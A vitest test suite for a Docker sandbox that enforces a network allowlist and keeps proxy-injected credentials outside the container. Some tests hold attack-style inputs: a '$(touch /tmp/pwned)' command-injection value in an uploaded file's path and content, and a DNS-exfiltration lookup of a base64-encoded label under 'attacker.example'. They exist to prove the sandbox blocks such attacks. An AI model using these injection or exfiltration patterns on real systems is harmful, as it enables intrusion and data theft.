import { createServer, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'

import { afterAll, beforeAll, describe, expect, it } from 'vitest'

import { expectSmallRecipe } from './provider-recipe'
import { dockerSandboxProvider, removeStaleSandboxes } from './docker-sandbox'
import { createIsolatedSandbox, type IsolatedSandbox } from './sandbox'

// Runs real containers: Docker must be up. It needs the internet for the allowed domains it reaches.
let echo: Server
let port: number
const seen: Record<string, string | string[] | undefined>[] = []

let sandbox: IsolatedSandbox
const sh = (command: string, timeoutMs = 60_000) => sandbox.backend.execute(command, { timeoutMs })

beforeAll(async () => {
  echo = createServer((req, res) => {
    seen.push(req.headers)
    res.end('echo')
  })
  await new Promise<void>((done) => echo.listen(0, '0.0.0.0', done))
  port = (echo.address() as AddressInfo).port
  sandbox = await createIsolatedSandbox(dockerSandboxProvider(), {
    timeoutMs: 10 * 60_000,
    egress: [
      { domain: 'registry.npmjs.org' },
      { domain: 'github.com' },
      { domain: 'host.docker.internal', headers: { authorization: 'Bearer the-real-secret' } },
    ],
  })
}, 300_000)

afterAll(async () => {
  await sandbox?.stop()
  await new Promise((done) => echo?.close(done))
})

describe('the docker sandbox', () => {
  it('runs a command as an ordinary user in /work and reports the real exit code', async () => {
    expect(await sh('id -un; pwd')).toMatchObject({ stdout: 'node\n/work\n', exitCode: 0 })
    expect(await sh('echo oops >&2; exit 7')).toMatchObject({ stderr: 'oops\n', exitCode: 7 })
  })

  it('reaps an orphan that exits, so a check that a subprocess is gone sees it gone', async () => {
    const result = await sh(
      "sh -c 'sleep 1 & echo $!' > /tmp/orphan; sleep 2; kill -0 $(cat /tmp/orphan) 2>/dev/null && echo alive || echo gone",
    )
    expect(result.stdout).toBe('gone\n')
  })

  it('lets a client reach a server that listens on localhost, as on a hosted runner', async () => {
    const result = await sh(
      `node -e "const s=require('http').createServer((q,r)=>r.end('ok')).listen(5173,'localhost',async()=>{console.log(await (await fetch('http://localhost:5173')).text());process.exit(0)})"`,
    )
    expect(result).toMatchObject({ stdout: 'ok\n', exitCode: 0 })
  })

  it('stops a command that outlives its timeout, and says so', async () => {
    const result = await sh('sleep 30', 2_000)
    expect(result).toMatchObject({ exitCode: 124, timedOut: true })
  })

  it('writes a file anywhere the user may, without the path or the content reaching a shell', async () => {
    await sandbox.backend.uploadFile(
      '/tmp/dir with space/it$s "quoted".txt',
      'a\nb $(touch /tmp/pwned)\n',
    )
    expect((await sh('cat "/tmp/dir with space/it\\$s \\"quoted\\".txt"')).stdout).toBe(
      'a\nb $(touch /tmp/pwned)\n',
    )
    expect((await sh('test -e /tmp/pwned && echo PWNED || echo ok')).stdout).toBe('ok\n')
  })

  it('reaches a domain on the allowlist over https, with the proxy certificate trusted', async () => {
    const curl = await sh(
      'curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org/left-pad',
    )
    expect(curl.stdout).toBe('200')
    const node = await sh(
      `node -e "fetch('https://registry.npmjs.org/left-pad').then(r => console.log(r.status))"`,
    )
    expect(node.stdout.trim()).toBe('200')
    const git = await sh('git ls-remote https://github.com/usetheokit/theokit-sdk.git HEAD')
    expect(git.exitCode).toBe(0)
    expect(git.stdout).toMatch(/^[0-9a-f]{40}\tHEAD/)
  }, 120_000)

  it('refuses every other domain, however it is asked', async () => {
    expect(
      (await sh('curl -s -o /dev/null -w "%{http_code}" https://example.com/')).stdout,
    ).not.toBe('200')
    expect(
      (
        await sh('curl -s -m 8 --noproxy "*" https://example.com/ -o /dev/null; echo $?')
      ).stdout.trim(),
    ).not.toBe('0')
    expect(
      (await sh('curl -sf -m 8 --noproxy "*" http://1.1.1.1/ -o /dev/null; echo $?')).stdout.trim(),
    ).not.toBe('0')
    const node = await sh(
      `node -e "fetch('https://example.com').then(r => console.log(r.status), e => console.log('refused'))"`,
    )
    expect(node.stdout.trim()).not.toBe('200')
  }, 120_000)

  // A child that a test starts with only PATH and HOME has no proxy variable, no CA variable and no
  // COREPACK_HOME. On E2B the firewall is outside the sandbox, so it still reaches the network; here the
  // route and the resolver of the sandbox must do the same.
  const bare = (command: string) => `env -i PATH="$PATH" HOME="$HOME" ${command}`

  it('runs the small recipe every provider runs: children with a bare environment, and the declared pnpm', async () => {
    await expectSmallRecipe((command) => sh(command, 120_000))
  }, 240_000)

  it('refuses a connection by address and a name that is not allowed, so nothing leaves through DNS or an IP', async () => {
    const direct = await sh(bare('curl -s -m 8 -k https://1.1.1.1/ -o /dev/null; echo $?'))
    expect(direct.stdout.trim()).not.toBe('0')
    // The proxy answers REFUSED for a name the rules do not list, so a name that carries data resolves nowhere.
    const unlisted = await sh(bare('getent hosts c2VjcmV0.attacker.example; echo $?'))
    expect(unlisted.stdout.trim()).toBe('2')
    expect((await sh(bare('getent hosts registry.npmjs.org'))).exitCode).toBe(0)
  }, 120_000)

  it('gives a child that drops the environment the same package manager cache and Node headers', async () => {
    const cache = await sh(bare('sh -c "readlink -f $HOME/.cache/node/corepack"'))
    expect(cache.stdout.trim()).toBe('/cache/corepack')
    expect((await sh('echo $npm_config_nodedir')).stdout.trim()).toBe('/usr/local')
  })

  it('attaches the headers of a rule outside the sandbox, so the secret is never inside it', async () => {
    seen.length = 0
    const reply = await sh(
      `curl -s http://host.docker.internal:${port}/ -H 'authorization: forged'`,
    )
    expect(reply.stdout).toBe('echo')
    expect(seen.at(-1)?.authorization).toBe('Bearer the-real-secret')
    const inside = await sh(
      'env; cat /home/node/factory-ca-bundle.pem | head -c 0; grep -rl the-real-secret /home /tmp /work 2>/dev/null; true',
    )
    expect(inside.stdout).not.toContain('the-real-secret')
  })

  it('keeps the downloads of a repository for its next sandbox, and gives them to no other repository', async () => {
    const key = `e2e-${Date.now()}`
    const make = (cacheKey: string) =>
      createIsolatedSandbox(dockerSandboxProvider(), {
        timeoutMs: 5 * 60_000,
        cacheKey,
        egress: [{ domain: 'registry.npmjs.org' }],
      })
    const first = await make(key)
    expect(
      (
        await first.backend.execute(
          `mkdir -p p && cd p && echo '{"packageManager":"pnpm@10.34.1"}' > package.json && pnpm store path && echo kept > /cache/marker`,
          { timeoutMs: 90_000 },
        )
      ).stdout,
    ).toContain('/cache/pnpm')
    await first.stop()

    const second = await make(key)
    expect((await second.backend.execute('cat /cache/marker', { timeoutMs: 30_000 })).stdout).toBe(
      'kept\n',
    )
    await second.stop()

    const other = await make(`${key}-other`)
    expect(
      (await other.backend.execute('cat /cache/marker 2>&1; true', { timeoutMs: 30_000 })).stdout,
    ).toContain('No such file')
    await other.stop()
  }, 180_000)

  it('is gone, with its proxy and its network, once it is stopped', async () => {
    const temporary = await createIsolatedSandbox(dockerSandboxProvider(), {
      timeoutMs: 5 * 60_000,
      egress: [{ domain: 'registry.npmjs.org' }],
    })
    const before = await listed()
    expect(before.length).toBeGreaterThanOrEqual(2)
    await temporary.stop()
    const after = await listed()
    expect(after.length).toBe(before.length - 2)
  }, 120_000)

  it('removes what an earlier process left behind once it is old enough, and nothing younger', async () => {
    expect(await removeStaleSandboxes(60 * 60_000)).toBe(0)
    expect((await listed()).length).toBeGreaterThanOrEqual(2)
  })
})

async function listed(): Promise<string[]> {
  const { execFileSync } = await import('node:child_process')
  return execFileSync(
    'docker',
    ['ps', '-a', '--filter', 'label=aifactory.sandbox', '--format', '{{.Names}}'],
    {
      encoding: 'utf8',
    },
  )
    .split('\n')
    .filter(Boolean)
}
